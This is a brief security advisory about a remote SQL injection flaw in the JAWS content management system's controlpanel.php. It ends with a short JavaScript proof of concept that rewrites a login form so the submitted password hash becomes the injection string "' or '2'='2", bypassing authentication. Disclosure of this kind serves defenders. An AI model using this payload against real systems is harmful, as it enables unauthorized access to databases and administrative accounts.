JAWS is reportedly affected by a remote SQL injection vulnerability. This issue occurs in the controlpanel.php script due to a failure of the application to properly sanitize user-supplied URI parameter input before using it in an SQL query.

Because of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database.

<script type="text/javascript">

function crypt_form(form) {
var new_password = calcMD5(form.password.value);
form.crypted_password.value = "' or '2'='2";
form.password.value = "";
return true;
}
</script>
